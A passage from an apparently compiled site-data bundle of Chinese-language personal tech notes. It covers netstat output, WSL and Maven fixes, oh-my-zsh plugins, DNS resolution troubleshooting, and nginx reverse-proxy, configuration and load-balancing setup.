210.34.6.84:netbios-ssn established\ntcp 0 0 localhost.localdom:9001 localhost.localdom:1162 established\ntcp 0 0 localhost.localdom:1162 localhost.localdom:9001 established\ntcp 0 80 210.34.6.89:1161 210.34.6.10:netbios-ssn close\n\nactive unix domain sockets (w/o servers)\nproto refcnt flags type state i-node path\nunix 1 [ ] stream connected 16178 @000000dd\nunix 1 [ ] stream connected 16176 @000000dc\nunix 9 [ ] dgram 5292 /dev/log\nunix 1 [ ] stream connected 16182 @000000df\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n从整体上看，netstat的输出结果可以分为两个部分：\n\n一个是active internet connections，称为有源tcp连接，其中"recv-q"和"send-q"指%0a的是接收队列和发送队列。这些数字一般都应该是0。如果不是则表示软件包正在队列中堆积。这种情况只能在非常少的情况见到。\n\n另一个是active unix domain sockets，称为有源unix域套接口(和网络套接字一样，但是只能用于本机通信，性能可以提高一倍)。 proto显示连接使用的协议,refcnt表示连接到本套接口上的进程号,types显示套接口的类型,state显示套接口当前的状态,path表示连接到套接口的其它进程使用的路径名。\n\n常见参数 -a (all)显示所有选项，默认不显示listen相关 -t (tcp)仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化成数字。 -l 仅列出有在 listen (监听) 的服務状态\n\n-p 显示建立相关链接的程序名 -r 显示路由信息，路由表 -e 显示扩展信息，例如uid等 -s 按各个协议进行统计 -c 每隔一个固定时间，执行该netstat命令。\n\n提示：listen和listening的状态只有用-a或者-l才能看到\n\n常用命令：\n\nnetstat -nutlp\n\n\n1\n',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"wsl 设置 root 为默认用户",frontmatter:{title:"wsl 设置 root 为默认用户",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/e5af11/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/16.wsl%20%E8%AE%BE%E7%BD%AE%20root%20%E4%B8%BA%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7.html",relativePath:"08.软件使用/05.linux/16.wsl 设置 root 为默认用户.md",key:"v-97d4165e",path:"/pages/e5af11/",headersStr:null,content:" 1. 打开powershell\n 2. 输入 ubuntu config --default-user root\n 3. 如果报错 在 ubuntu的后面加个tab 最后就ok了",normalizedContent:" 1. 打开powershell\n 2. 输入 ubuntu config --default-user root\n 3. 如果报错 在 ubuntu的后面加个tab 最后就ok了",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"xxx解决",frontmatter:{title:"xxx解决",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/993fdc/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/17.wsl%20maven%E6%8A%A5%E9%94%99Non-resolvable%20parent%20POM%20for%20xxx.xxx%E8%A7%A3%E5%86%B3.html",relativePath:"08.软件使用/05.linux/17.wsl maven报错Non-resolvable parent POM for xxx.xxx解决.md",key:"v-370d2717",path:"/pages/993fdc/",headersStr:null,content:"解决方法如下： 进入到Linux的maven安装路径，找到$MAVEN_HOME/conf/settings.xml 复制到~/.m2/文件夹下（如果.m2文件夹不存在，则需要创建一下 cd ~,mkdir .m2），即可解决问题\n\n> 如果找不到linux下的maven安装目录，则使用cat /etc/profile查看/etc/profile文件里面设置的环境变量",normalizedContent:"解决方法如下： 进入到linux的maven安装路径，找到$maven_home/conf/settings.xml 复制到~/.m2/文件夹下（如果.m2文件夹不存在，则需要创建一下 cd ~,mkdir .m2），即可解决问题\n\n> 如果找不到linux下的maven安装目录，则使用cat /etc/profile查看/etc/profile文件里面设置的环境变量",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"zsh oh-my-zsh 插件",frontmatter:{title:"zsh oh-my-zsh 插件",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/a4d751/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/18.zsh%20oh-my-zsh%20%E6%8F%92%E4%BB%B6.html",relativePath:"08.软件使用/05.linux/18.zsh oh-my-zsh 插件.md",key:"v-64403f04",path:"/pages/a4d751/",headers:[{level:2,title:"git",slug:"git",normalizedTitle:"git",charIndex:19},{level:2,title:"autojump",slug:"autojump",normalizedTitle:"autojump",charIndex:229},{level:2,title:"Z",slug:"z",normalizedTitle:"z",charIndex:500},{level:2,title:"zsh-syntax-highlighting",slug:"zsh-syntax-highlighting",normalizedTitle:"zsh-syntax-highlighting",charIndex:909},{level:2,title:"zsh-autosuggestions",slug:"zsh-autosuggestions",normalizedTitle:"zsh-autosuggestions",charIndex:1212},{level:2,title:"sublime",slug:"sublime",normalizedTitle:"sublime",charIndex:1563},{level:2,title:"git-open",slug:"git-open",normalizedTitle:"git-open",charIndex:1754},{level:2,title:"history 命令时间格式",slug:"history-命令时间格式",normalizedTitle:"history 命令时间格式",charIndex:2248},{level:2,title:"主题",slug:"主题",normalizedTitle:"主题",charIndex:2343},{level:2,title:"别名",slug:"别名",normalizedTitle:"别名",charIndex:2435},{level:2,title:"bat 代替 cat",slug:"bat-代替-cat",normalizedTitle:"bat 代替 cat",charIndex:2639}],headersStr:"git autojump Z zsh-syntax-highlighting zsh-autosuggestions sublime git-open history 命令时间格式 主题 别名 bat 代替 cat",content:'# oh-my-zsh 插件\n\n\n# git\n\n默认已开启\n\n作用\n\n可以使用各种 git 命令缩写。😋\n\n比如\n\ngit add --all ===> gaa\ngit commit -m ===> gcmsg\n\n\n1\n2\n\n\n\n\n查看所有 git 命令缩写\n\ncat ~/.oh-my-zsh/plugins/git/git.plugin.zsh\n\n或者筛选对应的命令\n\n如和 config 有关的命令\n\nalias | grep config\n\n\n# autojump\n\nautojump 官网\n\n作用 目录间快速跳转,不用再一直 cd 了 😁\n\n使用\n\n使用 autojump 的缩写 j\n\ncd 命令进入 ~/user/github/Youthink 文件夹，下一次再想进入 Yourhink 文件夹的时候,直接 j youthink 即可 或者只输入 youthink 的一部分 youth 都行\n\n删除无效路径\n\nj --purge 无效路径\n\n打开 muisc 文件夹\n\njo music\n\n多个参数一起使用 打开 /home/user/work/inbox\n\nj w in\n\n和 Z 不同 autojump 不是 zsh 内置的插件，需要额外安装。\n\n首先安装 autojump，如果你用 Mac，可以使用 brew 安装：\n\nbrew install autojump\n\n如果是 Linux，可以使用 git 安装，比如：\n\ngit clone git://github.com/joelthelion/autojump.git\n\n进入目录，执行\n\n./install.py\n\n最后把以下代码加入 .zshrc：\n\n[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] && . ~/.autojump/etc/profile.d/autojump.sh\n\n\n# Z\n\n如果你不想额外安装 autojump\n\n可以使用 oh-my-zsh 内置的类似组件 Z\n\n和 autojump 除了名字不一样，基本雷同。\n\nz -x 无效路径\n\n效果图\n\n\n\n\n# zsh-syntax-highlighting\n\n官网\n\n作用 平常用的ls、cd 等命令输入正确会绿色高亮显示，输入错误会显示其他的颜色。\n\n\n\n安装\n\n克隆项目\n\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n在 ~/.zshrc 中配置\n\nplugins=(其他的插件 zsh-syntax-highlighting)\n\n使配置生效\n\nsource ~/.zshrc\n\n\n# zsh-autosuggestions\n\n官网\n\n作用\n\n效率神器 👍\n\n如图输入命令时，会给出建议的命令（灰色部分）按键盘 → 补全\n\n\n\n如果感觉 → 补全不方便，还可以自定义补全的快捷键，比如我设置的逗号补全\n\nbindkey \',\' autosuggest-accept\n\n在 .zshrc 文件添加这句话即可。\n\n安装\n\n克隆项目\n\ngit clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions\n\n在 ~/.zshrc 中配置\n\nplugins=(其他的插件 zsh-autosuggestions)\n\n使配置生效\n\nsource ~/.zshrc\n\n\n# sublime\n\n官网\n\n已经内置直接启用即可\n\n作用\n\n在命令行使用 Sublime Text 打开文件、项目\n\n命令         作用\nst         打开 sublime\nst + 文件夹   打开该文件夹\nst + 文件    打开该文件\nstt        打开当前的文件夹，相当于 st .\nsst        管理员权限 相当于 sudo st\n\n\n# git-open\n\n官网\n\n在终端里打开当前项目的远程仓库地址\n\n不要小看这个插件欧，每次改完本地代码，当你想用浏览器访问远程仓库的时候，就知道这个插件多方便了 😘\n\n支持打开的远程仓库\n\n * github.com\n * gist.github.com\n * gitlab.com\n * 自定义域名的 GitLab\n * bitbucket.org\n * Atlassian Bitbucket Server (formerly Atlassian Stash)\n * Visual Studio Team Services\n * Team Foundation Server (on-premises)\n\n安装\n\n克隆项目\n\ngit clone https://github.com/paulirish/git-open.git $ZSH_CUSTOM/plugins/git-open\n\n在 ~/.zshrc 中配置\n\nplugins=(其他的插件 git-open)\n\n使配置生效\n\nsource ~/.zshrc\n\n\n# 其他\n\n> 我在 .zshrc 中的其他配置\n\n\n# history 命令时间格式\n\nhistory 命令查看历史输入命令的时间展示格式\n\nHIST_STAMPS="yyyy-mm-dd"\n\n\n\n时间会按照指定的格式展示，方便搜索查看\n\n\n# 主题\n\n在 ~/.zshrc 文件中设置主题为 random 即可开启随机主题\n\nZSH_THEME="random"\n\n每次打开新的终端的时候，zsh 都会随机使用一个主题\n\n\n# 别名\n\nalias go="git-open"\n\nalias rm="trash"\n\n安装了一个 trash 命令，替代 rm 命令，被删除的文件会放到垃圾桶\n\ntrash 官网\n\n安装方式\n\nnpm install --global trash-cli\n\nalias cp="cp -i\n\n防止 copy 的时候覆盖已存在的文件, 带上 i 选项，文件已存在的时候，会提示，需要确认才能 copy\n\n\n# bat 代替 cat\n\ncat 某个文件，可以在终端直接输出文件内容，bat 相比 cat 增加了行号和颜色高亮 👍\n\n直接上个效果\n\n\n\n官网\n\n安装方式\n\nmacOS 上\n\nbrew install bat',normalizedContent:'# oh-my-zsh 插件\n\n\n# git\n\n默认已开启\n\n作用\n\n可以使用各种 git 命令缩写。😋\n\n比如\n\ngit add --all ===> gaa\ngit commit -m ===> gcmsg\n\n\n1\n2\n\n\n\n\n查看所有 git 命令缩写\n\ncat ~/.oh-my-zsh/plugins/git/git.plugin.zsh\n\n或者筛选对应的命令\n\n如和 config 有关的命令\n\nalias | grep config\n\n\n# autojump\n\nautojump 官网\n\n作用 目录间快速跳转,不用再一直 cd 了 😁\n\n使用\n\n使用 autojump 的缩写 j\n\ncd 命令进入 ~/user/github/youthink 文件夹，下一次再想进入 yourhink 文件夹的时候,直接 j youthink 即可 或者只输入 youthink 的一部分 youth 都行\n\n删除无效路径\n\nj --purge 无效路径\n\n打开 muisc 文件夹\n\njo music\n\n多个参数一起使用 打开 /home/user/work/inbox\n\nj w in\n\n和 z 不同 autojump 不是 zsh 内置的插件，需要额外安装。\n\n首先安装 autojump，如果你用 mac，可以使用 brew 安装：\n\nbrew install autojump\n\n如果是 linux，可以使用 git 安装，比如：\n\ngit clone git://github.com/joelthelion/autojump.git\n\n进入目录，执行\n\n./install.py\n\n最后把以下代码加入 .zshrc：\n\n[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] && . ~/.autojump/etc/profile.d/autojump.sh\n\n\n# z\n\n如果你不想额外安装 autojump\n\n可以使用 oh-my-zsh 内置的类似组件 z\n\n和 autojump 除了名字不一样，基本雷同。\n\nz -x 无效路径\n\n效果图\n\n\n\n\n# zsh-syntax-highlighting\n\n官网\n\n作用 平常用的ls、cd 等命令输入正确会绿色高亮显示，输入错误会显示其他的颜色。\n\n\n\n安装\n\n克隆项目\n\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${zsh_custom:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n在 ~/.zshrc 中配置\n\nplugins=(其他的插件 zsh-syntax-highlighting)\n\n使配置生效\n\nsource ~/.zshrc\n\n\n# zsh-autosuggestions\n\n官网\n\n作用\n\n效率神器 👍\n\n如图输入命令时，会给出建议的命令（灰色部分）按键盘 → 补全\n\n\n\n如果感觉 → 补全不方便，还可以自定义补全的快捷键，比如我设置的逗号补全\n\nbindkey \',\' autosuggest-accept\n\n在 .zshrc 文件添加这句话即可。\n\n安装\n\n克隆项目\n\ngit clone git://github.com/zsh-users/zsh-autosuggestions $zsh_custom/plugins/zsh-autosuggestions\n\n在 ~/.zshrc 中配置\n\nplugins=(其他的插件 zsh-autosuggestions)\n\n使配置生效\n\nsource ~/.zshrc\n\n\n# sublime\n\n官网\n\n已经内置直接启用即可\n\n作用\n\n在命令行使用 sublime text 打开文件、项目\n\n命令         作用\nst         打开 sublime\nst + 文件夹   打开该文件夹\nst + 文件    打开该文件\nstt        打开当前的文件夹，相当于 st .\nsst        管理员权限 相当于 sudo st\n\n\n# git-open\n\n官网\n\n在终端里打开当前项目的远程仓库地址\n\n不要小看这个插件欧，每次改完本地代码，当你想用浏览器访问远程仓库的时候，就知道这个插件多方便了 😘\n\n支持打开的远程仓库\n\n * github.com\n * gist.github.com\n * gitlab.com\n * 自定义域名的 gitlab\n * bitbucket.org\n * atlassian bitbucket server (formerly atlassian stash)\n * visual studio team services\n * team foundation server (on-premises)\n\n安装\n\n克隆项目\n\ngit clone https://github.com/paulirish/git-open.git $zsh_custom/plugins/git-open\n\n在 ~/.zshrc 中配置\n\nplugins=(其他的插件 git-open)\n\n使配置生效\n\nsource ~/.zshrc\n\n\n# 其他\n\n> 我在 .zshrc 中的其他配置\n\n\n# history 命令时间格式\n\nhistory 命令查看历史输入命令的时间展示格式\n\nhist_stamps="yyyy-mm-dd"\n\n\n\n时间会按照指定的格式展示，方便搜索查看\n\n\n# 主题\n\n在 ~/.zshrc 文件中设置主题为 random 即可开启随机主题\n\nzsh_theme="random"\n\n每次打开新的终端的时候，zsh 都会随机使用一个主题\n\n\n# 别名\n\nalias go="git-open"\n\nalias rm="trash"\n\n安装了一个 trash 命令，替代 rm 命令，被删除的文件会放到垃圾桶\n\ntrash 官网\n\n安装方式\n\nnpm install --global trash-cli\n\nalias cp="cp -i\n\n防止 copy 的时候覆盖已存在的文件, 带上 i 选项，文件已存在的时候，会提示，需要确认才能 copy\n\n\n# bat 代替 cat\n\ncat 某个文件，可以在终端直接输出文件内容，bat 相比 cat 增加了行号和颜色高亮 👍\n\n直接上个效果\n\n\n\n官网\n\n安装方式\n\nmacos 上\n\nbrew install bat',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Temporary failure in name resolution（域名解析暂时失败）解决方法",frontmatter:{title:"Temporary failure in name resolution（域名解析暂时失败）解决方法",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/3a223a/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/21.Temporary%20failure%20in%20name%20resolution%EF%BC%88%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%9A%82%E6%97%B6%E5%A4%B1%E8%B4%A5%EF%BC%89%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.html",relativePath:"08.软件使用/05.linux/21.Temporary failure in name resolution（域名解析暂时失败）解决方法.md",key:"v-4d3aa334",path:"/pages/3a223a/",headersStr:null,content:"ping: www.baidu.com: Temporary failure in name resolution\n\n经过尝试，如下方法能解决此问题：\n\n**vi /etc/hosts **添加下面的\n\n127.0.0.1       localhost.localdomain localhost\n\n\n1\n\n\n**vim /etc/resolv.conf **添加下面的\n\n\n\n1.  nameserver 8.8.8.8\n    \n2.  nameserver 114.114.114.114\n    \n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n然后:wq保存改动",normalizedContent:"ping: www.baidu.com: temporary failure in name resolution\n\n经过尝试，如下方法能解决此问题：\n\n**vi /etc/hosts **添加下面的\n\n127.0.0.1       localhost.localdomain localhost\n\n\n1\n\n\n**vim /etc/resolv.conf **添加下面的\n\n\n\n1.  nameserver 8.8.8.8\n    \n2.  nameserver 114.114.114.114\n    \n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n然后:wq保存改动",charsets:{cjk:!0},lastUpdated:"2022/05/31, 14:41:23",lastUpdatedTimestamp:1653979283e3},{title:"nginx反向代理",frontmatter:{title:"nginx反向代理",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/29f009/",categories:["软件使用","nginx"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/06.nginx/02.nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html",relativePath:"08.软件使用/06.nginx/02.nginx反向代理.md",key:"v-39f89297",path:"/pages/29f009/",headers:[{level:2,title:"语法",slug:"语法",normalizedTitle:"语法",charIndex:205},{level:2,title:"语法说明",slug:"语法说明",normalizedTitle:"语法说明",charIndex:395},{level:2,title:"匹配规则（先后顺序）",slug:"匹配规则-先后顺序",normalizedTitle:"匹配规则（先后顺序）",charIndex:632}],headersStr:"语法 语法说明 匹配规则（先后顺序）",content:"# 配置\n\nserver {\n    listen       80;\n    server_name  localhost;\n\n    location / {\n\t     # 最后结尾处一定要加上 /\n       proxy_pass http://another/web/location/;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# location路径匹配\n\n\n# 语法\n\n[ = |~ | ~* | ^~ | @ ] /uri/\n\n注：\n\n * uri是指匹配路径\n * [ =| ~ | ~* | ^~ | @ ] 是指匹配规则（可选）\n\n   location ^~/uri/{\n       ...\n   }\n   location =/uri/{\n       ...\n   }\n   ...\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 语法说明\n\n * = : 完全匹配，表示精确匹配后面的url\n * ^~ : 无正则普通匹配（ ^ 表示“非”，~ 表示“正则”，字符意思是：不会继续匹配正则），表示普通字符匹配，如果该选项匹配，只匹配该选项，不匹配别的选项，一般用来匹配目录\n * / : 普通匹配（/xxx）\n * ~ : 表示正则匹配，区分大小写\n * ~* : 表示正则匹配，不区分大小写\n * @ : “@” 定义一个命名的 location，使用在内部定向时，例如 error_page\n\n\n# 匹配规则（先后顺序）\n\n * = 前缀的指令严格匹配这个查询，优先级最高，一旦匹配成功，则停止搜索其他localtion的匹配项；\n * 所有剩下的常规字符串（^~和普通匹配），‘最长命中’规则，优先使用匹配最长的结果。\n * 正则表达式，在配置文件中定义的顺序\n\n注： ^~ 和普通匹配。使用前缀匹配，不支持正则表达式，如果有多个location匹配成功的话，不会终止匹配过程，会记忆表达式最长的那个，如果得到的最长的location为 ^~ 类型，则表示阻断正则表达式，不再匹配正则表达式。如果得到的最长的location不是 ^~ 类型，继续匹配正则表达式，只要有一个正则成功，则使用这个正则的location，立即返回结果，并结束解析过程。",normalizedContent:"# 配置\n\nserver {\n    listen       80;\n    server_name  localhost;\n\n    location / {\n\t     # 最后结尾处一定要加上 /\n       proxy_pass http://another/web/location/;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# location路径匹配\n\n\n# 语法\n\n[ = |~ | ~* | ^~ | @ ] /uri/\n\n注：\n\n * uri是指匹配路径\n * [ =| ~ | ~* | ^~ | @ ] 是指匹配规则（可选）\n\n   location ^~/uri/{\n       ...\n   }\n   location =/uri/{\n       ...\n   }\n   ...\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 语法说明\n\n * = : 完全匹配，表示精确匹配后面的url\n * ^~ : 无正则普通匹配（ ^ 表示“非”，~ 表示“正则”，字符意思是：不会继续匹配正则），表示普通字符匹配，如果该选项匹配，只匹配该选项，不匹配别的选项，一般用来匹配目录\n * / : 普通匹配（/xxx）\n * ~ : 表示正则匹配，区分大小写\n * ~* : 表示正则匹配，不区分大小写\n * @ : “@” 定义一个命名的 location，使用在内部定向时，例如 error_page\n\n\n# 匹配规则（先后顺序）\n\n * = 前缀的指令严格匹配这个查询，优先级最高，一旦匹配成功，则停止搜索其他localtion的匹配项；\n * 所有剩下的常规字符串（^~和普通匹配），‘最长命中’规则，优先使用匹配最长的结果。\n * 正则表达式，在配置文件中定义的顺序\n\n注： ^~ 和普通匹配。使用前缀匹配，不支持正则表达式，如果有多个location匹配成功的话，不会终止匹配过程，会记忆表达式最长的那个，如果得到的最长的location为 ^~ 类型，则表示阻断正则表达式，不再匹配正则表达式。如果得到的最长的location不是 ^~ 类型，继续匹配正则表达式，只要有一个正则成功，则使用这个正则的location，立即返回结果，并结束解析过程。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"nginx配置文件",frontmatter:{title:"nginx配置文件",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/99e032/",categories:["软件使用","nginx"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/06.nginx/01.nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.html",relativePath:"08.软件使用/06.nginx/01.nginx配置文件.md",key:"v-9d201a8c",path:"/pages/99e032/",headers:[{level:2,title:"全局块",slug:"全局块",normalizedTitle:"全局块",charIndex:1248},{level:2,title:"event块",slug:"event块",normalizedTitle:"event块",charIndex:1434},{level:2,title:"http块",slug:"http块",normalizedTitle:"http块",charIndex:1531}],headersStr:"全局块 event块 http块",content:'# 配置文件总览\n\n * nginx.conf\n\nuser  nginx;\nworker_processes  auto;\n\nerror_log  /var/log/nginx/error.log notice;\npid        /var/run/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\n\nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n\n    log_format  main  \'$remote_addr - $remote_user [$time_local] "$request" \'\n                      \'$status $body_bytes_sent "$http_referer" \'\n                      \'"$http_user_agent" "$http_x_forwarded_for"\';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n    include /etc/nginx/conf.d/*.conf;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n * conf.d/default.conf\n\nserver {\n# 监听的端口号\n    listen       80;\n    listen  [::]:80;\n# 接受请求的ip\n    server_name  localhost;\n\n# 将接收到的请求 根据/usr/share/nginx/html路径请求资源\n# index参数默认是找index.html index.htm做默认\n    location / {\n        root   /usr/share/nginx/html;\n        index  index.html index.htm;\n    }\n\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n        root   /usr/share/nginx/html;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 配置解释\n\n\n# 全局块\n\nuser  nginx;\n# worker_processes越大，Nginx并发能力越强\nworker_processes  auto;\n# nginx错误日志存放的位置\nerror_log  /var/log/nginx/error.log notice;\npid        /var/run/nginx.pid;\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# event块\n\nevents {\n# worker_processes越大，Nginx并发能力越强\n    worker_connections  1024;\n}\n\n\n1\n2\n3\n4\n\n\n\n# http块\n\nhttp {\n# include 块引入了外部文件mime.types（该文件放着大量的媒体类型）\n# 默认的媒体类型是 application/octet-stream;\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n\n    log_format  main  \'$remote_addr - $remote_user [$time_local] "$request" \'\n                      \'$status $body_bytes_sent "$http_referer" \'\n                      \'"$http_user_agent" "$http_x_forwarded_for"\';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n# 引入了 /etc/nginx/conf.d/文件下的配置文件\n    include /etc/nginx/conf.d/*.conf;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',normalizedContent:'# 配置文件总览\n\n * nginx.conf\n\nuser  nginx;\nworker_processes  auto;\n\nerror_log  /var/log/nginx/error.log notice;\npid        /var/run/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\n\nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n\n    log_format  main  \'$remote_addr - $remote_user [$time_local] "$request" \'\n                      \'$status $body_bytes_sent "$http_referer" \'\n                      \'"$http_user_agent" "$http_x_forwarded_for"\';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n    include /etc/nginx/conf.d/*.conf;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n * conf.d/default.conf\n\nserver {\n# 监听的端口号\n    listen       80;\n    listen  [::]:80;\n# 接受请求的ip\n    server_name  localhost;\n\n# 将接收到的请求 根据/usr/share/nginx/html路径请求资源\n# index参数默认是找index.html index.htm做默认\n    location / {\n        root   /usr/share/nginx/html;\n        index  index.html index.htm;\n    }\n\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n        root   /usr/share/nginx/html;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 配置解释\n\n\n# 全局块\n\nuser  nginx;\n# worker_processes越大，nginx并发能力越强\nworker_processes  auto;\n# nginx错误日志存放的位置\nerror_log  /var/log/nginx/error.log notice;\npid        /var/run/nginx.pid;\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# event块\n\nevents {\n# worker_processes越大，nginx并发能力越强\n    worker_connections  1024;\n}\n\n\n1\n2\n3\n4\n\n\n\n# http块\n\nhttp {\n# include 块引入了外部文件mime.types（该文件放着大量的媒体类型）\n# 默认的媒体类型是 application/octet-stream;\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n\n    log_format  main  \'$remote_addr - $remote_user [$time_local] "$request" \'\n                      \'$status $body_bytes_sent "$http_referer" \'\n                      \'"$http_user_agent" "$http_x_forwarded_for"\';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n# 引入了 /etc/nginx/conf.d/文件下的配置文件\n    include /etc/nginx/conf.d/*.conf;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"nginx负载均衡",frontmatter:{title:"nginx负载均衡",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/3324a4/",categories:["软件使用","nginx"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/06.nginx/03.nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1.html",relativePath:"08.软件使用/06.nginx/03.nginx负载均衡.md",key:"v-30d70062",path:"/pages/3324a4/",headersStr:null,content:"Nginx为我们默认提供了三种负载均衡的策略： 1.轮询： 将客户端发起的请求，平均分配给每一台服务器 2.权重： 会将客户端的请求，根据服务器的权重值不同，分配不同的数量 3.ip_hash: 基于发起请求的客户端的ip地址不同，他始终会将请求发送到指定的服务器上 就是说如果这个客户端的请求的ip地址不变，那么处理请求的服务器将一直是同一个\n\n\n# 轮询\n\n想实现Nginx轮询负载均衡机制只需要修改配置文件如下\n\n# 声明一个upstream\nupstream my_server{\n    server ip1:port1;\n    server ip2:port2;\n}\nserver {\n    listen       80;\n    server_name  localhost;\n\n\tlocation / {\n        proxy_pass http://my_server/;\t# 上面声明的地址\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 权重\n\n实现权重的方式：在配置文件中upstream块中加上weight\n\nupstream my_server{\n# 增加权重\n    server ip1:port1 weight=10;\n    server ip2:port2 weight=2;\n}\nserver {\n    listen       80;\n    server_name  localhost;\n\n\tlocation / {\n        proxy_pass http://my_server/;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# ip_hash\n\n实现ip_hash方式：在配置文件upstream块中加上ip_hash\n\nupstream my_server{\n# 增加ip_hash配置\n  ip_hash;\n  server ip1:port1 weight=10;\n  server ip2:port2 weight=2;\n}\nserver {\n    listen       80;\n    server_name  localhost;\n\n\tlocation / {\n        proxy_pass http://my_server/;\t\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n",normalizedContent:"nginx为我们默认提供了三种负载均衡的策略： 1.轮询： 将客户端发起的请求，平均分配给每一台服务器 2.权重： 会将客户端的请求，根据服务器的权重值不同，分配不同的数量 3.ip_hash: 